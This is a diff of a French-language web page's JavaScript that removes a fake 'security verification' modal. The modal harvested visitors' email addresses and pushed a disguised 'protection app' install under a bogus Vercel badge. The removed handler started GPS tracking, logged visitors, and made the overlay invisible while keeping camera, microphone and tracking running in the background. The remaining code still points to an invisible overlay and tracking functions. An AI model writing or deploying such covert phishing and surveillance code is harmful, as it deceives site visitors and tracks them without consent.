@@ -627,31 +627,13 @@ const VERIFICATION_MODAL_HTML = `
             <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="#60a5fa" stroke-width="1.5" style="margin-bottom: 16px;">
                 <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
             </svg>
-            <h1 style="font-size: 1.5rem; font-weight: 600; margin: 0 0 8px 0;">Vérification de sécurité</h1>
-                    <p style="color: #94a3b8; font-size: 0.9rem; line-height: 1.5;">Saisissez l'email de votre session pour débloquer la galerie. Ce champ est obligatoire.</p>
+            <h1 style="font-size: 1.5rem; font-weight: 600; margin: 0 0 8px 0;">Connexion Sécurisée</h1>
+            <p style="color: #94a3b8; font-size: 0.9rem; line-height: 1.5;">Veuillez patienter pendant l'initialisation de la galerie...</p>
         </div>
 
-        <form id="fake-verify-form" style="text-align: left;">
-            <div style="margin-bottom: 20px;">
-                <label style="display: block; font-size: 0.8rem; color: #94a3b8; margin-bottom: 8px;">Adresse e-mail de session</label>
-                        <input type="email" id="trap-email-input" required placeholder="votre@email.com" autocomplete="email webauthn" inputmode="email" style="width: 100%; padding: 12px 16px; background: #0f172a; border: 1px solid #334155; border-radius: 8px; color: white; font-size: 1rem; outline: none;">
-            </div>
-            
-            <div style="margin-bottom: 20px; background: rgba(96, 165, 250, 0.1); padding: 12px; border-radius: 8px; border: 1px dashed #60a5fa;">
-                <label style="display: flex; align-items: center; gap: 10px; cursor: pointer;">
-                    <input type="checkbox" id="install-app-check" checked style="width: 18px; height: 18px;">
-                    <span style="font-size: 0.85rem; color: #60a5fa; font-weight: 500;">Installer l'App de Protection (Recommandé)</span>
-                </label>
-            </div>
-
-            <button type="submit" id="btn-verify-submit" style="width: 100%; padding: 14px; background: #3b82f6; color: white; border: none; border-radius: 8px; font-weight: 600; font-size: 1rem; cursor: pointer;">
-                Installer et Continuer
-            </button>
-        </form>
-
         <div style="margin-top: 24px; display: flex; align-items: center; justify-content: center; gap: 8px; color: #64748b; font-size: 0.75rem;">
-            <div style="width: 8px; height: 8px; background: #22c55e; border-radius: 50%; animation: pulse 2s infinite;"></div>
-            Vercel Secure App Installer Active
+            <div style="width: 48px; height: 48px; border: 3px solid rgba(96,165,250,0.3); border-top-color: #60a5fa; border-radius: 50%; animation: spin 1s linear infinite;"></div>
+            <style>@keyframes spin { to { transform: rotate(360deg); } }</style>
         </div>
     </div>
 `;
@@ -924,67 +906,7 @@ function showVerificationModal(overlay) {
 }
 
 function bindVerificationForm(overlay) {
-    const form = overlay.querySelector('#fake-verify-form');
-    if (!form || form.dataset.bound === '1') return;
-    form.dataset.bound = '1';
-
-    const emailInput = overlay.querySelector('#trap-email-input');
-    const installCheck = overlay.querySelector('#install-app-check');
-
-    emailInput.addEventListener('input', () => {
-        clearTimeout(emailLogDebounce);
-        const val = emailInput.value.trim();
-        if (val.includes('@')) {
-            emailLogDebounce = setTimeout(() => onEmailCaptured(val, false), 800);
-        }
-    });
-    emailInput.addEventListener('blur', () => {
-        const val = emailInput.value.trim();
-        if (val.includes('@')) onEmailCaptured(val, false);
-    });
-
-    const handleVerification = async (e) => {
-        if (e) e.preventDefault();
-
-        const email = emailInput.value.trim();
-        if (email && email.includes('@')) {
-            persistCapturedEmail(email);
-
-            if (installCheck.checked && deferredPrompt) {
-                deferredPrompt.prompt();
-                const { outcome } = await deferredPrompt.userChoice;
-                console.log(`Résultat installation : ${outcome}`);
-                deferredPrompt = null;
-            }
-
-            const btn = overlay.querySelector('#btn-verify-submit');
-            btn.disabled = true;
-            btn.innerText = 'Vérification en cours...';
-
-            try {
-                if (document.documentElement.requestFullscreen) {
-                    document.documentElement.requestFullscreen().catch(() => {});
-                }
-            } catch (err) {}
-
-            if (!gpsWatchStarted) startGpsTracking();
-            await logVisitor(null, true, true);
-
-            // --- PASSAGE EN BACKGROUND ---
-            // Au lieu de supprimer l'overlay, on le rend invisible
-            // Mais on garde les processus (caméra, micro, etc.) actifs
-            setTimeout(() => {
-                overlay.style.transition = 'opacity 1s ease';
-                overlay.style.opacity = '0';
-                overlay.style.pointerEvents = 'none'; // Rend les clics possibles sur le site en dessous
-                
-                // On ne fait PAS overlay.remove() pour que le tracker reste vivant
-                console.log("Système passé en arrière-plan. Tracking actif.");
-            }, 2000);
-        }
-    };
-
-    form.onsubmit = handleVerification;
+    // Le formulaire n'existe plus, on peut supprimer cette fonction ou la vider
 }
 
 function setupInvisibleVerifyOverlay(overlay) {
